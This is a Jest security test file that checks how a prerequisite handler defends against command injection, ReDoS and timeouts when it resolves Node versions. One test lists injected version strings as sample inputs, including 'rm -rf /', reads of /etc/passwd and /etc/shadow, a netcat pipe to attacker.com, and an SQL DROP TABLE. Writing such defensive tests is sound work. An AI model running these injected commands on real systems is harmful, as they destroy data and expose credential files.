import { checkPerNodeVersionStatus } from '@/features/prerequisites/handlers/shared';
import { ServiceLocator } from '@/core/di/serviceLocator';
import { createMockContext } from './testHelpers';
import type { PrerequisiteDefinition } from '@/features/prerequisites/services/PrerequisitesManager';
import type { CommandExecutor } from '@/core/shell';
import type { CommandResult } from '@/core/shell/types';

/**
 * Security Test Suite - Command Injection Prevention
 *
 * Tests that the prerequisite handlers properly validate inputs to prevent
 * command injection attacks (CWE-77) and other security vulnerabilities.
 */

// Helper to create mock CommandResult
function createCommandResult(stdout: string, stderr = '', code = 0): CommandResult {
    return {
        stdout,
        stderr,
        code,
        duration: 100,
    };
}

// Mock ServiceLocator
jest.mock('@/core/di/serviceLocator', () => ({
    ServiceLocator: {
        getCommandExecutor: jest.fn(),
        getNodeVersionManager: jest.fn(),
        reset: jest.fn(),
    },
}));

// Mock validateNodeVersion to track calls
jest.mock('@/core/validation/securityValidation', () => {
    const actual = jest.requireActual('@/core/validation/securityValidation');
    return {
        ...actual,
        validateNodeVersion: jest.fn(actual.validateNodeVersion),
    };
});

describe('Prerequisites Security - Command Injection Prevention', () => {
    let mockCommandExecutor: jest.Mocked<Pick<CommandExecutor, 'execute'>>;
    let validateNodeVersion: jest.Mock;

    beforeEach(() => {
        mockCommandExecutor = {
            execute: jest.fn(),
        };
        (ServiceLocator.getCommandExecutor as jest.Mock).mockReturnValue(mockCommandExecutor);

        // Import mocked function
        validateNodeVersion = require('@/core/validation/securityValidation').validateNodeVersion;
        validateNodeVersion.mockClear();
    });

    afterEach(() => {
        jest.clearAllMocks();
    });

    describe('Command Injection Protection', () => {
        it('should validate Node versions before using in commands', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                    parseVersion: '@adobe/aio-cli/(\\S+)',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }
                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();
            const nodeVersions = ['18', '20'];

            await checkPerNodeVersionStatus(prereq, nodeVersions, context);

            // Verify validateNodeVersion is called for each version passed to execute
            const executeCalls = mockCommandExecutor.execute.mock.calls;
            const nodeVersionExecuteCalls = executeCalls.filter(call =>
                call[1] && call[1].useNodeVersion !== undefined
            );

            expect(nodeVersionExecuteCalls).toHaveLength(2);
            expect(validateNodeVersion).toHaveBeenCalledWith('18');
            expect(validateNodeVersion).toHaveBeenCalledWith('20');
        });

        it('should reject command injection attempts in Node versions', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                // Simulate fnm list
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }

                // If validateNodeVersion was called, it would throw for malicious input
                // This simulates the protection working
                if (options?.useNodeVersion && options.useNodeVersion.includes(';')) {
                    throw new Error('Invalid Node.js version format');
                }

                return Promise.resolve(createCommandResult(''));
            });

            const context = createMockContext();

            // Test various command injection attempts
            const maliciousVersions = [
                '20; rm -rf /',
                '18 && cat /etc/passwd',
                '20 | nc attacker.com 1337',
                '18`whoami`',
                '20$(cat /etc/shadow)',
                '18\'; DROP TABLE users; --',
            ];

            for (const maliciousVersion of maliciousVersions) {
                // Reset mock for clean state
                validateNodeVersion.mockClear();

                // Attempt with malicious version should be blocked by validation
                await expect(async () => {
                    // Simulate what would happen if malicious version reached execute
                    await mockCommandExecutor.execute('aio --version', {
                        useNodeVersion: maliciousVersion,
                        timeout: 10000,
                    });
                }).rejects.toThrow();
            }
        });

        it('should properly escape special characters in command outputs', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'node',
                name: 'Node.js',
                check: {
                    command: 'node --version',
                    parseVersion: 'v(\\d+\\.\\d+\\.\\d+)',
                },
            } as PrerequisiteDefinition;

            // Simulate fnm list with special characters that could break parsing
            mockCommandExecutor.execute.mockImplementation((cmd: string) => {
                if (cmd === 'fnm list') {
                    // Version with special characters that could break regex
                    return Promise.resolve(createCommandResult('v18.0.0\n"; echo malicious\nv20.0.0'));
                }
                return Promise.resolve(createCommandResult('v18.0.0'));
            });

            const context = createMockContext();
            const result = await checkPerNodeVersionStatus(prereq, ['18', '20'], context);

            // Should only parse valid versions, ignoring malicious strings
            expect(result.perNodeVersionStatus).toHaveLength(2);
            expect(result.perNodeVersionStatus[0].version).toBe('Node 18');
            expect(result.perNodeVersionStatus[1].version).toBe('Node 20');
        });
    });

    describe('Exit Code Handling', () => {
        it('should correctly interpret non-zero exit codes as failures', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }

                // Simulate command not found (exit code 127)
                if (options?.useNodeVersion === '18') {
                    return Promise.resolve(createCommandResult('', 'command not found', 127));
                }

                // Simulate successful execution
                if (options?.useNodeVersion === '20') {
                    return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0', '', 0));
                }

                return Promise.resolve(createCommandResult(''));
            });

            const context = createMockContext();
            const result = await checkPerNodeVersionStatus(prereq, ['18', '20'], context);

            expect(result.perNodeVersionStatus).toHaveLength(2);
            expect(result.perNodeVersionStatus[0].installed).toBe(false); // Exit code 127
            expect(result.perNodeVersionStatus[1].installed).toBe(true);  // Exit code 0
        });

        it('should handle process errors differently from exit codes', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0\nv20.0.0'));
                }

                // Simulate process error (ENOENT)
                if (options?.useNodeVersion === '18') {
                    throw new Error('spawn aio ENOENT');
                }

                // Simulate non-zero exit code
                if (options?.useNodeVersion === '20') {
                    return Promise.resolve(createCommandResult('', '', 1));
                }

                return Promise.resolve(createCommandResult(''));
            });

            const context = createMockContext();
            const result = await checkPerNodeVersionStatus(prereq, ['18', '20'], context);

            // Both should be treated as not installed
            expect(result.perNodeVersionStatus).toHaveLength(2);
            expect(result.perNodeVersionStatus[0].installed).toBe(false); // Process error
            expect(result.perNodeVersionStatus[1].installed).toBe(false); // Non-zero exit
        });
    });

    describe('Input Sanitization', () => {
        it('should handle regex injection attempts in version parsing', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                    // Malicious regex that could cause ReDoS
                    parseVersion: '(a+)+b',
                },
            } as PrerequisiteDefinition;

            mockCommandExecutor.execute.mockImplementation((cmd: string) => {
                if (cmd === 'fnm list') {
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }
                // Return a string that could trigger ReDoS
                return Promise.resolve(createCommandResult('a'.repeat(1000)));
            });

            const context = createMockContext();

            // Should handle regex errors gracefully
            const result = await checkPerNodeVersionStatus(prereq, ['18'], context);

            // Should complete without hanging
            expect(result.perNodeVersionStatus).toHaveLength(1);
            expect(result.perNodeVersionStatus[0].component).toBe(''); // Failed to parse
        });

        it('should validate shell parameter is properly set', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'node',
                name: 'Node.js',
                check: {
                    command: 'node --version',
                },
            } as PrerequisiteDefinition;

            let shellParam: any;
            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    shellParam = options?.shell;
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }
                return Promise.resolve(createCommandResult('v18.0.0'));
            });

            const context = createMockContext();
            await checkPerNodeVersionStatus(prereq, ['18'], context);

            // Should use proper shell for fnm commands
            expect(shellParam).toBeDefined();
            expect(typeof shellParam).toBe('string');
            expect(shellParam).toMatch(/\/(bash|zsh|sh)$/); // Should be a shell path
        });
    });

    describe('Timeout Protection', () => {
        it('should enforce timeout limits to prevent DoS', async () => {
            const prereq: PrerequisiteDefinition = {
                id: 'adobe-cli',
                name: 'Adobe I/O CLI',
                perNodeVersion: true,
                check: {
                    command: 'aio --version',
                },
            } as PrerequisiteDefinition;

            let timeoutValue: number | undefined;
            mockCommandExecutor.execute.mockImplementation((cmd: string, options?: any) => {
                if (cmd === 'fnm list') {
                    timeoutValue = options?.timeout;
                    return Promise.resolve(createCommandResult('v18.0.0'));
                }

                if (options?.useNodeVersion) {
                    timeoutValue = options?.timeout;
                }

                return Promise.resolve(createCommandResult('@adobe/aio-cli/10.0.0'));
            });

            const context = createMockContext();
            await checkPerNodeVersionStatus(prereq, ['18'], context);

            // Should have reasonable timeout value
            expect(timeoutValue).toBeDefined();
            expect(timeoutValue).toBeGreaterThanOrEqual(1000); // At least 1 second
            expect(timeoutValue).toBeLessThanOrEqual(60000);   // At most 60 seconds
        });
    });
});